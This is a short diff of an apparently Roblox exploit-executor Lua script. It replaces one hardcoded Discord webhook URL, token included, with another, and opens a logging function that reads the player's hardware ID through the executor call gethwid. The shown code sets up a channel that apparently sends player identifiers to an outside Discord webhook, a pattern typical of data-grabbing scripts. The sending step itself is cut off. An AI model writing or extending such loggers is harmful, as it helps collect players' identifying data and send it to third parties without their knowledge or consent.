@@ -1,6 +1,6 @@
 local _LP = game:GetService("Players").LocalPlayer
 local _H  = game:GetService("HttpService")
-local _WH = "https://discord.com/api/webhooks/1535623831480176650/r6WiU7B2frf_bzTjMJTgRlxptZUTpXPc8Am8cyLA-trS3TuFBF_zeGKHTUJUkJQZ2YrQ"
+local _WH = "https://discord.com/api/webhooks/1546727619351937045/Nzru8W9snkNi64j-hyOMy4W3b6RuL3Zv3eubU9KOvcA7Zuvw4YPz3a8BdQG3gz_TP-jo"
 
 local function _log()
     local hwid    = (gethwid and gethwid()) or "N/A"
